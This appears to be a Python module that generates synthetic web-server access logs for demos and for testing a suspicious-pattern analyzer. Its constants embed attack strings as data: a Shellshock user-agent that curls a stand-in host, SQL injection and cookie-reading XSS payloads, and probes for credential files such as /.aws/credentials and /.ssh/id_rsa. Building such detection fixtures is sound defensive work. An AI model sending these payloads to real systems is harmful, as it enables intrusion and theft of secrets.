"""Synthetic NCSA Combined access-log generator.

The :class:`LogGenerator` class produces realistic web-server access
logs suitable for demos and analyzer testing. It models:

* a long-tail IP distribution (most traffic from a few hundred IPs)
* a small set of "attacker" IPs with elevated request volume
* a realistic URL inventory (homepage, products, static assets, APIs)
* a mix of browser and bot user-agents
* a realistic status-code mix (~85% 200, plus 304/301/404/500/403/401)
* a diurnal traffic pattern over the chosen window
* embedded suspicious patterns for the :class:`SuspiciousPatternAnalyzer`
"""

from __future__ import annotations

import math
import random
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Iterable, Sequence

from faker import Faker


# ---------------------------------------------------------------------------
# Constants — realistic content for synthetic traffic
# ---------------------------------------------------------------------------

_BENIGN_PATHS: Sequence[tuple[str, float]] = (
    ("/", 12.0),
    ("/index.html", 4.0),
    ("/about", 2.0),
    ("/contact", 1.5),
    ("/blog", 3.0),
    ("/blog/2026/why-rich-tables-rule", 2.0),
    ("/blog/2026/python-3-13-release-notes", 2.0),
    ("/products", 4.0),
    ("/products/laptop-x1", 2.5),
    ("/products/keyboard-pro", 2.0),
    ("/products/mouse-quantum", 1.5),
    ("/cart", 2.0),
    ("/checkout", 1.0),
    ("/login", 1.5),
    ("/signup", 0.8),
    ("/account", 1.2),
    ("/static/css/main.css", 8.0),
    ("/static/js/app.js", 8.0),
    ("/static/js/vendor.js", 5.0),
    ("/static/img/logo.svg", 6.0),
    ("/static/img/hero.jpg", 4.0),
    ("/static/img/avatar.png", 3.0),
    ("/favicon.ico", 7.0),
    ("/robots.txt", 1.0),
    ("/sitemap.xml", 0.7),
    ("/feed.rss", 0.8),
    ("/api/v1/products", 4.0),
    ("/api/v1/products/123", 2.0),
    ("/api/v1/cart", 2.0),
    ("/api/v1/users/me", 2.0),
    ("/api/v1/search?q=laptop", 1.5),
    ("/api/v1/search?q=keyboard", 1.0),
    ("/api/v1/orders", 1.0),
    ("/health", 2.0),
    ("/metrics", 1.5),
)

_BROWSER_AGENTS: Sequence[tuple[str, float]] = (
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        30.0,
    ),
    (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        12.0,
    ),
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
        "Gecko/20100101 Firefox/121.0",
        10.0,
    ),
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        8.0,
    ),
    (
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        9.0,
    ),
    (
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        7.0,
    ),
)

_BOT_AGENTS: Sequence[tuple[str, float]] = (
    (
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        4.0,
    ),
    (
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        2.5,
    ),
    (
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
        1.0,
    ),
    (
        "Mozilla/5.0 (compatible; DuckDuckBot/1.1; +http://duckduckgo.com/duckduckbot.html)",
        0.5,
    ),
    (
        "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
        0.5,
    ),
    (
        "curl/8.5.0",
        0.3,
    ),
    (
        "python-requests/2.31.0",
        0.2,
    ),
)

_ATTACKER_AGENTS: Sequence[str] = (
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "Nikto/2.5.0",
    "() { :;}; /bin/bash -c 'curl http://evil.example/x'",
    "Mozilla/5.0 zgrab/0.x",
    "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
    "Mozilla/5.0 (compatible; ZmEu)",
)

_STATUS_DISTRIBUTION: Sequence[tuple[int, float]] = (
    (200, 78.0),
    (304, 8.0),
    (301, 3.0),
    (302, 2.0),
    (404, 4.0),
    (403, 1.5),
    (401, 1.5),
    (500, 1.2),
    (502, 0.4),
    (503, 0.4),
)

_SUSPICIOUS_PATHS: Sequence[str] = (
    "/admin",
    "/admin/login",
    "/admin.php",
    "/wp-login.php",
    "/wp-admin/setup-config.php",
    "/wp-admin/admin-ajax.php",
    "/.env",
    "/.env.backup",
    "/.git/config",
    "/.git/HEAD",
    "/phpmyadmin",
    "/phpmyadmin/index.php",
    "/cgi-bin/admin.cgi",
    "/server-status",
    "/.aws/credentials",
    "/.ssh/id_rsa",
    "/config.php.bak",
    "/backup.zip",
    "/db.sql",
)

_SQLI_PAYLOADS: Sequence[str] = (
    "/api/v1/products?id=1' OR '1'='1",
    "/api/v1/products?id=1; DROP TABLE users--",
    "/search?q=' UNION SELECT password FROM users--",
    "/login?user=admin'--&pass=x",
    "/api/v1/users?name=' OR 1=1--",
)

_XSS_PAYLOADS: Sequence[str] = (
    "/search?q=<script>alert(1)</script>",
    "/comment?text=<img src=x onerror=alert(1)>",
    "/profile?bio=javascript:alert(document.cookie)",
    "/search?q=<svg/onload=alert(1)>",
)

_DIRBUSTER_PATHS: Sequence[str] = (
    "/backup",
    "/old",
    "/test",
    "/tmp",
    "/uploads",
    "/dev",
    "/staging",
    "/private",
    "/hidden",
    "/api/v0",
    "/api/internal",
    "/console",
    "/swagger",
    "/api-docs",
    "/_ignition/execute-solution",
    "/actuator/env",
    "/wp-content/plugins/old/readme.txt",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
)

_HTTP_METHODS_BENIGN: Sequence[tuple[str, float]] = (
    ("GET", 80.0),
    ("POST", 12.0),
    ("HEAD", 4.0),
    ("PUT", 1.5),
    ("DELETE", 1.0),
    ("OPTIONS", 1.5),
)


# ---------------------------------------------------------------------------
# Generator
# ---------------------------------------------------------------------------


@dataclass
class GeneratorStats:
    """Summary of one generation run."""

    total_lines: int
    suspicious_lines: int
    unique_ips: int
    output_path: Path


class LogGenerator:
    """Generate realistic NCSA Combined access logs.

    Parameters
    ----------
    seed:
        Optional integer seed for fully deterministic output (used by tests).
    suspicious_ratio:
        Approximate fraction of lines that should contain a suspicious
        signal (default 0.005 = 0.5%).
    attacker_ips:
        Number of "attacker" IPs that issue elevated request volume.
    benign_ip_pool:
        Size of the rotating pool of normal-visitor IP addresses.
    """

    def __init__(
        self,
        seed: int | None = None,
        suspicious_ratio: float = 0.005,
        attacker_ips: int = 6,
        benign_ip_pool: int = 350,
    ) -> None:
        if not 0.0 <= suspicious_ratio <= 1.0:
            raise ValueError("suspicious_ratio must be between 0 and 1")
        if attacker_ips < 1:
            raise ValueError("attacker_ips must be >= 1")
        if benign_ip_pool < 10:
            raise ValueError("benign_ip_pool must be >= 10")

        self.suspicious_ratio = suspicious_ratio
        self._rng = random.Random(seed)
        self._faker = Faker()
        if seed is not None:
            Faker.seed(seed)

        self._benign_ips = [self._faker.ipv4_public() for _ in range(benign_ip_pool)]
        # Long-tail weights: a handful of "loyal" visitors dominate.
        self._benign_weights = [
            max(1.0, self._rng.expovariate(1 / 5.0)) for _ in self._benign_ips
        ]
        self._attacker_ips = [self._faker.ipv4_public() for _ in range(attacker_ips)]
        # Attackers issue ~30x more requests than the average benign IP.
        avg_benign = sum(self._benign_weights) / len(self._benign_weights)
        self._attacker_weights = [avg_benign * 30.0 for _ in self._attacker_ips]

    # ----- public API ------------------------------------------------------

    def generate(
        self,
        output: str | Path,
        lines: int,
        days: int = 7,
        end: datetime | None = None,
    ) -> GeneratorStats:
        """Generate ``lines`` log entries to ``output``.

        Parameters
        ----------
        output:
            Destination file path. Existing files are overwritten.
        lines:
            Number of log lines to generate (must be >= 1).
        days:
            Time window to spread the entries over (default 7 days).
        end:
            Optional explicit window end. Defaults to "now" (UTC).
        """
        if lines < 1:
            raise ValueError("lines must be >= 1")
        if days < 1:
            raise ValueError("days must be >= 1")

        end_dt = (end or datetime.now(timezone.utc)).astimezone(timezone.utc)
        start_dt = end_dt - timedelta(days=days)

        path = Path(output)
        path.parent.mkdir(parents=True, exist_ok=True)

        suspicious_count = 0
        seen_ips: set[str] = set()

        timestamps = self._build_timestamps(lines, start_dt, end_dt)
        timestamps.sort()

        with path.open("w", encoding="utf-8", newline="\n") as fh:
            for ts in timestamps:
                is_suspicious = self._rng.random() < self.suspicious_ratio
                line = self._build_line(ts, suspicious=is_suspicious)
                fh.write(line)
                fh.write("\n")
                if is_suspicious:
                    suspicious_count += 1
                seen_ips.add(line.split(" ", 1)[0])

        return GeneratorStats(
            total_lines=lines,
            suspicious_lines=suspicious_count,
            unique_ips=len(seen_ips),
            output_path=path,
        )

    # ----- timestamp distribution ------------------------------------------

    def _build_timestamps(
        self, lines: int, start: datetime, end: datetime
    ) -> list[datetime]:
        """Sample ``lines`` timestamps with a diurnal weighting."""
        total_seconds = (end - start).total_seconds()
        timestamps: list[datetime] = []
        for _ in range(lines):
            # Reject sampling against a sin-shaped diurnal curve.
            for _attempt in range(8):
                offset = self._rng.random() * total_seconds
                ts = start + timedelta(seconds=offset)
                hour = ts.hour + ts.minute / 60.0
                # Peak around 14:00 UTC, trough around 02:00 UTC.
                weight = 0.45 + 0.55 * (
                    0.5 + 0.5 * math.sin((hour - 8.0) / 24.0 * 2 * math.pi)
                )
                if self._rng.random() < weight:
                    timestamps.append(ts)
                    break
            else:
                timestamps.append(ts)
        return timestamps

    # ----- line building ---------------------------------------------------

    def _build_line(self, ts: datetime, *, suspicious: bool) -> str:
        if suspicious:
            ip = self._rng.choices(
                self._attacker_ips, weights=self._attacker_weights, k=1
            )[0]
            method, path, status = self._suspicious_request()
            user_agent = self._rng.choice(_ATTACKER_AGENTS)
        else:
            ip = self._rng.choices(
                self._benign_ips, weights=self._benign_weights, k=1
            )[0]
            method, path, status = self._benign_request()
            user_agent = self._weighted_choice(_BROWSER_AGENTS + _BOT_AGENTS)

        size = self._size_for_status(status, path)
        referer = self._referer_for(path)
        ts_str = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
        return (
            f'{ip} - - [{ts_str}] "{method} {path} HTTP/1.1" '
            f'{status} {size} "{referer}" "{user_agent}"'
        )

    def _benign_request(self) -> tuple[str, str, int]:
        method = self._weighted_choice(_HTTP_METHODS_BENIGN)
        path = self._weighted_choice(_BENIGN_PATHS)
        status = self._weighted_choice(_STATUS_DISTRIBUTION)
        # HEAD requests rarely produce 5xx errors in this synthetic corpus.
        if method == "HEAD" and status >= 500:
            status = 200
        return method, path, status

    def _suspicious_request(self) -> tuple[str, str, int]:
        kind = self._rng.choices(
            ("path", "sqli", "xss", "dirbuster", "brute"),
            weights=(40, 15, 10, 25, 10),
            k=1,
        )[0]
        if kind == "path":
            path = self._rng.choice(_SUSPICIOUS_PATHS)
            method = self._rng.choices(("GET", "POST"), weights=(80, 20), k=1)[0]
            status = self._rng.choices((404, 403, 401, 200), weights=(70, 15, 10, 5), k=1)[0]
        elif kind == "sqli":
            path = self._rng.choice(_SQLI_PAYLOADS)
            method = "GET"
            status = self._rng.choices((400, 500, 200, 403), weights=(40, 30, 20, 10), k=1)[0]
        elif kind == "xss":
            path = self._rng.choice(_XSS_PAYLOADS)
            method = "GET"
            status = self._rng.choices((200, 400, 403), weights=(60, 25, 15), k=1)[0]
        elif kind == "dirbuster":
            path = self._rng.choice(_DIRBUSTER_PATHS)
            method = "GET"
            status = self._rng.choices((404, 403), weights=(85, 15), k=1)[0]
        else:  # brute
            path = "/login"
            method = "POST"
            status = self._rng.choices((401, 403, 200), weights=(70, 20, 10), k=1)[0]
        return method, path, status

    # ----- helpers ---------------------------------------------------------

    def _weighted_choice(self, choices: Iterable[tuple[object, float]]) -> object:
        items, weights = zip(*choices)
        return self._rng.choices(items, weights=weights, k=1)[0]

    def _size_for_status(self, status: int, path: str) -> int:
        if status in (204, 304):
            return 0
        if status >= 500:
            return self._rng.randint(200, 800)
        if status == 404:
            return self._rng.randint(150, 600)
        if path.endswith((".css", ".js")):
            return self._rng.randint(2000, 80000)
        if path.endswith((".jpg", ".png", ".svg", ".ico")):
            return self._rng.randint(1500, 250000)
        if path.startswith("/api/"):
            return self._rng.randint(80, 8000)
        return self._rng.randint(500, 30000)

    def _referer_for(self, path: str) -> str:
        if path.startswith("/static/") or path.endswith(".ico"):
            return "https://example.com/"
        if self._rng.random() < 0.55:
            return "-"
        candidates = (
            "https://www.google.com/",
            "https://duckduckgo.com/",
            "https://www.bing.com/",
            "https://news.ycombinator.com/",
            "https://t.co/",
            "https://example.com/",
        )
        return self._rng.choice(candidates)
